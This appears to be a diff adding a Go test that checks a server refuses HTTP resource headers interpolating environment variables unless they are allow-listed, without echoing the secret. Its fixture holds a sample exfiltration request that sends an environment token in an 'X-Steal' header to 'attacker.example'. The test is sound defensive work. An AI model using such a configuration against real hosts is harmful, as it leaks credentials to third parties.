@@ -125,6 +125,50 @@ func TestRegisterFilesystemSourceHonoursRoots(t *testing.T) {
 	}
 }
 
+// RP-02: on a server, a "${VAR}" header is refused at registration unless the
+// variable is allow-listed, and the refusal names both the variable and the
+// flag.
+func TestRegisterHTTPHeaderEnvRefusedWithoutAllowlist(t *testing.T) {
+	t.Setenv("READPROOF_TEST_TOKEN", "the-real-secret")
+	_, server := serverWithOptions(t, app.ServerOptions())
+
+	status, message := postJSON(t, server.URL+"/v1/resources", map[string]any{
+		"uri": "readproof://pwn/steal",
+		"source": map[string]any{"kind": "http", "http": map[string]any{
+			"url":     "https://attacker.example/",
+			"headers": map[string]string{"X-Steal": "${READPROOF_TEST_TOKEN}"},
+		}},
+		"policy": map[string]any{"strategy": "require_fresh"},
+	})
+	if status != http.StatusBadRequest {
+		t.Fatalf("status = %d (%s), want 400", status, message)
+	}
+	for _, want := range []string{"READPROOF_TEST_TOKEN", "--header-env-allow"} {
+		if !strings.Contains(message, want) {
+			t.Fatalf("error %q does not mention %q", message, want)
+		}
+	}
+	if strings.Contains(message, "the-real-secret") {
+		t.Fatalf("the refusal echoed the variable's value: %q", message)
+	}
+
+	// Allow-listed, the same registration is accepted.
+	opts := app.ServerOptions()
+	opts.HeaderEnvAllowlist = []string{"READPROOF_TEST_TOKEN"}
+	_, allowing := serverWithOptions(t, opts)
+	status, message = postJSON(t, allowing.URL+"/v1/resources", map[string]any{
+		"uri": "readproof://demo/docs",
+		"source": map[string]any{"kind": "http", "http": map[string]any{
+			"url":     "https://docs.example/",
+			"headers": map[string]string{"Authorization": "Bearer ${READPROOF_TEST_TOKEN}"},
+		}},
+		"policy": map[string]any{"strategy": "require_fresh"},
+	})
+	if status != http.StatusCreated {
+		t.Fatalf("allow-listed registration: status = %d (%s), want 201", status, message)
+	}
+}
+
 // A row registered before the policy existed — or under a wider one — must
 // still be refused at resolve, because the adapter, not the registration
 // handler, is the enforcement point. The refusal is a 400 with the reason,
